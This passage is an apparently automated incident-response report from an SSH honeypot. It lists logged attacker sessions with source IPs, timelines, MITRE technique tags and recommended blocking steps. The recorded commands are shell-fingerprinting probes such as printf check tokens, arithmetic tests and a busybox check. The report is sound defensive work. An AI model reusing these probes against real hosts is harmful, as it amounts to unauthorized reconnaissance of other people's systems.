| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d6a733a41395c6502c0e18f5675d32ee_small_control'"'"' '"'"'check_d6a733a41395c6502c0e18f5675d32ee'"'"'', printf '\n%s|%s\n' 'check_d6a733a41395c6502c0e18f5675d32ee_small_control' 'check_d6a733a41395c6502c0e18f5675d32ee', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d6a733a41395c6502c0e18f5675d32ee_small_math'"'"' "$((117*338+50))"', (117*338+50, printf '\n%s|%s\n' 'check_d6a733a41395c6502c0e18f5675d32ee_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:18:51` | `cowrie.session.connect` |
| `2026-11-03 04:18:52` | `cowrie.client.version` |
| `2026-11-03 04:18:52` | `cowrie.client.kex` |
| `2026-11-03 04:18:54` | `cowrie.login.success` |
| `2026-11-03 04:18:56` | `cowrie.client.size` |
| `2026-11-03 04:18:57` | `cowrie.session.params` |
| `2026-11-03 04:18:58` | `cowrie.command.input` |
| `2026-11-03 04:18:58` | `cowrie.command.input` |
| `2026-11-03 04:18:58` | `cowrie.command.input` |
| `2026-11-03 04:18:58` | `cowrie.command.input` |
| `2026-11-03 04:18:58` | `cowrie.command.input` |
| `2026-11-03 04:18:58` | `cowrie.command.input` |
| `2026-11-03 04:18:58` | `cowrie.command.input` |
| `2026-11-03 04:18:58` | `cowrie.command.input` |
| `2026-11-03 04:18:58` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40f5788c9779

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:20 |
| **Last Seen** | 2026-11-03 04:21 |
| **Session Duration** | 58s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3cb4aeab002b6e2589bd10d29b436172_small_control'"'"' '"'"'check_3cb4aeab002b6e2589bd10d29b436172'"'"'', printf '\n%s|%s\n' 'check_3cb4aeab002b6e2589bd10d29b436172_small_control' 'check_3cb4aeab002b6e2589bd10d29b436172', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3cb4aeab002b6e2589bd10d29b436172_small_math'"'"' "$((586*121+21))"', (586*121+21, printf '\n%s|%s\n' 'check_3cb4aeab002b6e2589bd10d29b436172_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:20:43` | `cowrie.session.connect` |
| `2026-11-03 04:20:44` | `cowrie.client.version` |
| `2026-11-03 04:20:44` | `cowrie.client.kex` |
| `2026-11-03 04:20:46` | `cowrie.login.success` |
| `2026-11-03 04:20:48` | `cowrie.client.size` |
| `2026-11-03 04:20:49` | `cowrie.session.params` |
| `2026-11-03 04:20:50` | `cowrie.command.input` |
| `2026-11-03 04:20:50` | `cowrie.command.input` |
| `2026-11-03 04:20:50` | `cowrie.command.input` |
| `2026-11-03 04:20:50` | `cowrie.command.input` |
| `2026-11-03 04:20:50` | `cowrie.command.input` |
| `2026-11-03 04:20:50` | `cowrie.command.input` |
| `2026-11-03 04:20:50` | `cowrie.command.input` |
| `2026-11-03 04:20:50` | `cowrie.command.input` |
| `2026-11-03 04:20:50` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42b0c722dd44

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:22 |
| **Last Seen** | 2026-11-03 04:23 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2ac4ade3ba6bb193db87c795de89e37e_small_control'"'"' '"'"'check_2ac4ade3ba6bb193db87c795de89e37e'"'"'', printf '\n%s|%s\n' 'check_2ac4ade3ba6bb193db87c795de89e37e_small_control' 'check_2ac4ade3ba6bb193db87c795de89e37e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2ac4ade3ba6bb193db87c795de89e37e_small_math'"'"' "$((979*912+85))"', (979*912+85, printf '\n%s|%s\n' 'check_2ac4ade3ba6bb193db87c795de89e37e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:22:39` | `cowrie.session.connect` |
| `2026-11-03 04:22:40` | `cowrie.client.version` |
| `2026-11-03 04:22:40` | `cowrie.client.kex` |
| `2026-11-03 04:22:42` | `cowrie.login.success` |
| `2026-11-03 04:22:44` | `cowrie.client.size` |
| `2026-11-03 04:22:45` | `cowrie.session.params` |
| `2026-11-03 04:22:45` | `cowrie.command.input` |
| `2026-11-03 04:22:45` | `cowrie.command.input` |
| `2026-11-03 04:22:45` | `cowrie.command.input` |
| `2026-11-03 04:22:45` | `cowrie.command.input` |
| `2026-11-03 04:22:45` | `cowrie.command.input` |
| `2026-11-03 04:22:45` | `cowrie.command.input` |
| `2026-11-03 04:22:45` | `cowrie.command.input` |
| `2026-11-03 04:22:45` | `cowrie.command.input` |
| `2026-11-03 04:22:45` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ecc32ee15d

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-11-03 04:23 |
| **Last Seen** | 2026-11-03 04:23 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:23:03` | `cowrie.session.connect` |
| `2026-11-03 04:23:03` | `cowrie.client.version` |
| `2026-11-03 04:23:04` | `cowrie.client.kex` |
| `2026-11-03 04:23:04` | `cowrie.login.success` |
| `2026-11-03 04:23:08` | `cowrie.direct-tcpip.request` |
| `2026-11-03 04:23:09` | `cowrie.direct-tcpip.ja4` |
| `2026-11-03 04:23:09` | `cowrie.direct-tcpip.data` |
| `2026-11-03 04:23:09` | `cowrie.direct-tcpip.request` |
| `2026-11-03 04:23:12` | `cowrie.direct-tcpip.ja4` |
| `2026-11-03 04:23:12` | `cowrie.direct-tcpip.data` |
| `2026-11-03 04:23:21` | `cowrie.direct-tcpip.request` |
| `2026-11-03 04:23:22` | `cowrie.direct-tcpip.ja4` |
| `2026-11-03 04:23:22` | `cowrie.direct-tcpip.data` |
| `2026-11-03 04:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91d01abe2611

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:24 |
| **Last Seen** | 2026-11-03 04:25 |
| **Session Duration** | 53s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_df7ba0c0559a62d21b1403e84c6cef08_small_control'"'"' '"'"'check_df7ba0c0559a62d21b1403e84c6cef08'"'"'', printf '\n%s|%s\n' 'check_df7ba0c0559a62d21b1403e84c6cef08_small_control' 'check_df7ba0c0559a62d21b1403e84c6cef08', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_df7ba0c0559a62d21b1403e84c6cef08_small_math'"'"' "$((383*522+79))"', (383*522+79, printf '\n%s|%s\n' 'check_df7ba0c0559a62d21b1403e84c6cef08_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:24:33` | `cowrie.session.connect` |
| `2026-11-03 04:24:34` | `cowrie.client.version` |
| `2026-11-03 04:24:34` | `cowrie.client.kex` |
| `2026-11-03 04:24:36` | `cowrie.login.success` |
| `2026-11-03 04:24:38` | `cowrie.client.size` |
| `2026-11-03 04:24:38` | `cowrie.session.params` |
| `2026-11-03 04:24:39` | `cowrie.command.input` |
| `2026-11-03 04:24:39` | `cowrie.command.input` |
| `2026-11-03 04:24:39` | `cowrie.command.input` |
| `2026-11-03 04:24:39` | `cowrie.command.input` |
| `2026-11-03 04:24:39` | `cowrie.command.input` |
| `2026-11-03 04:24:39` | `cowrie.command.input` |
| `2026-11-03 04:24:39` | `cowrie.command.input` |
| `2026-11-03 04:24:39` | `cowrie.command.input` |
| `2026-11-03 04:24:39` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e55bb7408f0f

| Field | Detail |
|---|---|
| **Source IP** | `176.65.132[.]216` |
| **First Seen** | 2026-11-03 04:25 |
| **Last Seen** | 2026-11-03 04:28 |
| **Session Duration** | 180s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:25:51` | `cowrie.session.connect` |
| `2026-11-03 04:25:51` | `cowrie.login.success` |
| `2026-11-03 04:25:52` | `cowrie.session.params` |
| `2026-11-03 04:28:52` | `cowrie.log.closed` |
| `2026-11-03 04:28:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.132[.]216` to AbuseIPDB if not already reported
- [ ] Block `176.65.132[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7420f808edda

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]162` |
| **First Seen** | 2026-11-03 04:26 |
| **Last Seen** | 2026-11-03 04:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:26:26` | `cowrie.session.connect` |
| `2026-11-03 04:26:27` | `cowrie.login.success` |
| `2026-11-03 04:26:27` | `cowrie.session.params` |
| `2026-11-03 04:26:28` | `cowrie.command.input` |
| `2026-11-03 04:26:28` | `cowrie.command.input` |
| `2026-11-03 04:26:29` | `cowrie.command.input` |
| `2026-11-03 04:26:29` | `cowrie.command.input` |
| `2026-11-03 04:26:29` | `cowrie.command.failed` |
| `2026-11-03 04:26:30` | `cowrie.log.closed` |
| `2026-11-03 04:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]162` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6ef3a76726

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:26 |
| **Last Seen** | 2026-11-03 04:27 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_089bcc35fe13753d5e4dcb615f2bd0c6_small_control'"'"' '"'"'check_089bcc35fe13753d5e4dcb615f2bd0c6'"'"'', printf '\n%s|%s\n' 'check_089bcc35fe13753d5e4dcb615f2bd0c6_small_control' 'check_089bcc35fe13753d5e4dcb615f2bd0c6', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_089bcc35fe13753d5e4dcb615f2bd0c6_small_math'"'"' "$((210*746+70))"', (210*746+70, printf '\n%s|%s\n' 'check_089bcc35fe13753d5e4dcb615f2bd0c6_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:26:32` | `cowrie.session.connect` |
| `2026-11-03 04:26:33` | `cowrie.client.version` |
| `2026-11-03 04:26:33` | `cowrie.client.kex` |
| `2026-11-03 04:26:35` | `cowrie.login.success` |
| `2026-11-03 04:26:37` | `cowrie.client.size` |
| `2026-11-03 04:26:38` | `cowrie.session.params` |
| `2026-11-03 04:26:38` | `cowrie.command.input` |
| `2026-11-03 04:26:38` | `cowrie.command.input` |
| `2026-11-03 04:26:38` | `cowrie.command.input` |
| `2026-11-03 04:26:38` | `cowrie.command.input` |
| `2026-11-03 04:26:38` | `cowrie.command.input` |
| `2026-11-03 04:26:38` | `cowrie.command.input` |
| `2026-11-03 04:26:38` | `cowrie.command.input` |
| `2026-11-03 04:26:38` | `cowrie.command.input` |
| `2026-11-03 04:26:38` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b73955135485

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:28 |
| **Last Seen** | 2026-11-03 04:29 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7d4770854a1c31100d4a600577a00d14_small_control'"'"' '"'"'check_7d4770854a1c31100d4a600577a00d14'"'"'', printf '\n%s|%s\n' 'check_7d4770854a1c31100d4a600577a00d14_small_control' 'check_7d4770854a1c31100d4a600577a00d14', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7d4770854a1c31100d4a600577a00d14_small_math'"'"' "$((168*67+62))"', (168*67+62, printf '\n%s|%s\n' 'check_7d4770854a1c31100d4a600577a00d14_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:28:30` | `cowrie.session.connect` |
| `2026-11-03 04:28:30` | `cowrie.client.version` |
| `2026-11-03 04:28:30` | `cowrie.client.kex` |
| `2026-11-03 04:28:33` | `cowrie.login.success` |
| `2026-11-03 04:28:35` | `cowrie.client.size` |
| `2026-11-03 04:28:35` | `cowrie.session.params` |
| `2026-11-03 04:28:36` | `cowrie.command.input` |
| `2026-11-03 04:28:36` | `cowrie.command.input` |
| `2026-11-03 04:28:36` | `cowrie.command.input` |
| `2026-11-03 04:28:36` | `cowrie.command.input` |
| `2026-11-03 04:28:36` | `cowrie.command.input` |
| `2026-11-03 04:28:36` | `cowrie.command.input` |
| `2026-11-03 04:28:36` | `cowrie.command.input` |
| `2026-11-03 04:28:36` | `cowrie.command.input` |
| `2026-11-03 04:28:36` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf16e2f0ba1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:30 |
| **Last Seen** | 2026-11-03 04:31 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_15c65d2996039000c54d5d310201d02f_small_control'"'"' '"'"'check_15c65d2996039000c54d5d310201d02f'"'"'', printf '\n%s|%s\n' 'check_15c65d2996039000c54d5d310201d02f_small_control' 'check_15c65d2996039000c54d5d310201d02f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_15c65d2996039000c54d5d310201d02f_small_math'"'"' "$((590*66+46))"', (590*66+46, printf '\n%s|%s\n' 'check_15c65d2996039000c54d5d310201d02f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:30:27` | `cowrie.session.connect` |
| `2026-11-03 04:30:28` | `cowrie.client.version` |
| `2026-11-03 04:30:28` | `cowrie.client.kex` |
| `2026-11-03 04:30:30` | `cowrie.login.success` |
| `2026-11-03 04:30:31` | `cowrie.client.size` |
| `2026-11-03 04:30:32` | `cowrie.session.params` |
| `2026-11-03 04:30:32` | `cowrie.command.input` |
| `2026-11-03 04:30:32` | `cowrie.command.input` |
| `2026-11-03 04:30:32` | `cowrie.command.input` |
| `2026-11-03 04:30:32` | `cowrie.command.input` |
| `2026-11-03 04:30:32` | `cowrie.command.input` |
| `2026-11-03 04:30:32` | `cowrie.command.input` |
| `2026-11-03 04:30:32` | `cowrie.command.input` |
| `2026-11-03 04:30:32` | `cowrie.command.input` |
| `2026-11-03 04:30:32` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3cc207199b1

| Field | Detail |
|---|---|
| **Source IP** | `35.210.93[.]182` |
| **First Seen** | 2026-11-03 04:32 |
| **Last Seen** | 2026-11-03 04:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:32:01` | `cowrie.session.connect` |
| `2026-11-03 04:32:01` | `cowrie.login.success` |
| `2026-11-03 04:32:02` | `cowrie.session.params` |
| `2026-11-03 04:32:02` | `cowrie.command.input` |
| `2026-11-03 04:32:02` | `cowrie.command.input` |
| `2026-11-03 04:32:02` | `cowrie.command.failed` |
| `2026-11-03 04:32:02` | `cowrie.command.input` |
| `2026-11-03 04:32:02` | `cowrie.log.closed` |
| `2026-11-03 04:32:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.93[.]182` to AbuseIPDB if not already reported
- [ ] Block `35.210.93[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fc258e59e36

| Field | Detail |
|---|---|
| **Source IP** | `35.210.93[.]182` |
| **First Seen** | 2026-11-03 04:32 |
| **Last Seen** | 2026-11-03 04:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:32:11` | `cowrie.session.connect` |
| `2026-11-03 04:32:11` | `cowrie.login.success` |
| `2026-11-03 04:32:11` | `cowrie.session.params` |
| `2026-11-03 04:32:11` | `cowrie.command.input` |
| `2026-11-03 04:32:11` | `cowrie.command.failed` |
| `2026-11-03 04:32:20` | `cowrie.log.closed` |
| `2026-11-03 04:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.93[.]182` to AbuseIPDB if not already reported
- [ ] Block `35.210.93[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb188998e08d

| Field | Detail |
|---|---|
| **Source IP** | `35.210.93[.]182` |
| **First Seen** | 2026-11-03 04:32 |
| **Last Seen** | 2026-11-03 04:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:32:13` | `cowrie.session.connect` |
| `2026-11-03 04:32:13` | `cowrie.login.success` |
| `2026-11-03 04:32:13` | `cowrie.session.params` |
| `2026-11-03 04:32:13` | `cowrie.command.input` |
| `2026-11-03 04:32:20` | `cowrie.log.closed` |
| `2026-11-03 04:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.93[.]182` to AbuseIPDB if not already reported
- [ ] Block `35.210.93[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a98fb5ae43

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-03 04:32 |
| **Last Seen** | 2026-11-03 04:33 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6d858d97d33cac6708a5486e6a735b91_small_control'"'"' '"'"'check_6d858d97d33cac6708a5486e6a735b91'"'"'', printf '\n%s|%s\n' 'check_6d858d97d33cac6708a5486e6a735b91_small_control' 'check_6d858d97d33cac6708a5486e6a735b91', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6d858d97d33cac6708a5486e6a735b91_small_math'"'"' "$((122*572+5))"', (122*572+5, printf '\n%s|%s\n' 'check_6d858d97d33cac6708a5486e6a735b91_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-03 04:32:19` | `cowrie.session.connect` |
| `2026-11-03 04:32:20` | `cowrie.client.version` |
| `2026-11-03 04:32:20` | `cowrie.client.kex` |
| `2026-11-03 04:32:22` | `cowrie.login.success` |
| `2026-11-03 04:32:24` | `cowrie.client.size` |
| `2026-11-03 04:32:25` | `cowrie.session.params` |
| `2026-11-03 04:32:26` | `cowrie.command.input` |
| `2026-11-03 04:32:26` | `cowrie.command.input` |
| `2026-11-03 04:32:26` | `cowrie.command.input` |
| `2026-11-03 04:32:26` | `cowrie.command.input` |
| `2026-11-03 04:32:26` | `cowrie.command.input` |
| `2026-11-03 04:32:26` | `cowrie.command.input` |
| `2026-11-03 04:32:26` | `cowrie.command.input` |
| `2026-11-03 04:32:26` | `cowrie.command.input` |
| `2026-11-03 04:32:26` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (132) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-74f2023263fe | HIGH | `195.178.110[.]217` | 2026-11-03 04:34 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4490e890ed9c | HIGH | `195.178.110[.]217` | 2026-11-03 04:35 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-56ec5a76203b | HIGH | `195.178.110[.]217` | 2026-11-03 04:37 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e7d6673320c0 | HIGH | `195.178.110[.]217` | 2026-11-03 04:39 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b94a48d68b90 | HIGH | `195.178.110[.]217` | 2026-11-03 04:41 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-328d88b9a307 | HIGH | `195.178.110[.]217` | 2026-11-03 04:43 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-c50e5a5821f0 | HIGH | `195.178.110[.]217` | 2026-11-03 04:45 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-daba49b662c6 | HIGH | `70.54.182[.]130` | 2026-11-03 04:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c3a32e1a58af | HIGH | `70.54.182[.]130` | 2026-11-03 04:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e7927ccf1b49 | HIGH | `203.145.143[.]163` | 2026-11-03 04:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9e7bd32dd3d5 | HIGH | `203.145.143[.]163` | 2026-11-03 04:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6d6f633cbbaa | HIGH | `195.178.110[.]217` | 2026-11-03 04:47 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-260a8d9e8539 | HIGH | `103.248.120[.]6` | 2026-11-03 04:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a6e645de7405 | HIGH | `103.248.120[.]6` | 2026-11-03 04:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c8e3918f86af | HIGH | `80.94.95[.]118` | 2026-11-03 04:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-74e8d4fd2550 | HIGH | `195.178.110[.]217` | 2026-11-03 04:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7498eeef7a15 | HIGH | `115.151.72[.]155` | 2026-11-03 04:49 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-bdb7d496fc2b | HIGH | `115.151.72[.]155` | 2026-11-03 04:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1b05d8f2dd32 | HIGH | `60.214.154[.]254` | 2026-11-03 04:51 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-91c02ba5f212 | HIGH | `120.48.67[.]120` | 2026-11-03 04:51 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-86d8ceb3c038 | HIGH | `115.190.243[.]99` | 2026-11-03 04:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b985f701f913 | HIGH | `176.53.159[.]196` | 2026-11-03 04:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3e6a0f9fcb21 | HIGH | `35.210.237[.]238` | 2026-11-03 04:57 | Y | 2 | 0 | `T1078` |
| IR-4578e36d11e9 | HIGH | `35.210.237[.]238` | 2026-11-03 04:57 | Y | 1 | 0 | `T1078` |
| IR-4c75f0009edc | HIGH | `35.210.237[.]238` | 2026-11-03 04:57 | Y | 0 | 0 | `T1078` |
| IR-b2ac64459c69 | HIGH | `118.145.144[.]95` | 2026-11-03 04:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ff09a8a088c8 | HIGH | `118.145.144[.]95` | 2026-11-03 04:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d6e9532a7774 | HIGH | `193.187.110[.]160` | 2026-11-03 04:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f93e86e39e49 | HIGH | `2.57.122[.]238` | 2026-11-03 05:08 | Y | 1 | 0 | `T1078 · T1592` |
| IR-761fe1caee74 | HIGH | `71.6.134[.]231` | 2026-11-03 05:26 | Y | 3 | 0 | `T1078` |
| IR-1592dc32bd08 | HIGH | `35.210.55[.]156` | 2026-11-03 05:40 | Y | 2 | 0 | `T1078` |
| IR-b07f56b0bc19 | HIGH | `35.210.55[.]156` | 2026-11-03 05:40 | Y | 1 | 0 | `T1078` |
| IR-80a6931e17dc | HIGH | `35.210.55[.]156` | 2026-11-03 05:40 | Y | 0 | 0 | `T1078` |
| IR-bec4d706c817 | HIGH | `93.152.221[.]37` | 2026-11-03 05:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9972520e2048 | HIGH | `36.133.100[.]246` | 2026-11-03 05:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-18cd87cb26e3 | HIGH | `36.133.100[.]246` | 2026-11-03 05:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-85f26f5b29ee | HIGH | `2.57.122[.]238` | 2026-11-03 06:00 | Y | 1 | 0 | `T1078 · T1592` |
